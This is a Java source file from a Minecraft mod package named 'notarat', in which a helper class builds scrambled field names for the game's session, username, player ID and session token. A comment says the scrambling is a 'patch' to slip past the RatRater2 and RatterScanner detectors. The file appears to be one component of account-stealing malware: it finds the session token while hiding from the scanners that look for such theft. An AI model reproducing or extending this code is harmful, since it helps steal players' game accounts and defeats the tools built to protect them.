package me.ghosty.notarat;

import net.minecraft.client.Minecraft;

final class Fields {
	
	static boolean isObf = false;
	static {
		try {
			// we don't care about gameSettings being randomized as it is often used in regular mods
			Minecraft.class.getField("gameSettings");
			// if we got to there, it is that the field exists, and so that they're not obfuscated
			isObf = true;
		} catch(Exception ignored) {}
	}
	
	static String getMc() {
		if(isObf)
			return Utils.replaceUseless("*t h*", "e* M* i n*", "*ec*r a*f", "*t");
		return get(71432, "P");
	}
	
	static String getSess() {
		if(isObf)
			return Utils.replaceUseless("s*e* s", "si* o* n");
		return get(71449, "j");
	}
	
	static String getName() {
		if(isObf)
			return Utils.replaceUseless("* us* er", "** *n*", "*am *e");
		return get(74286, "b");
	}
	
	static String getId() {
		if(isObf)
			return Utils.replaceUseless("  * p*l a", "* y *e", "r* I*D*  ");
		return get(148257, "b");
	}
	
	static String getTok() {
		if(isObf)
			return Utils.replaceUseless("t* o* ", "k** ", "e*n * ");
		return get(148258, "c");
	}
	
	/**
	 * Patch to RatRater2 & maybe RatterScanner which check for defined strings
	 */
	private static String get(int num, String let) {
		return Utils.replaceUseless("f*  ", "iel* d_" + num, "_*" + let);
	}
	
}
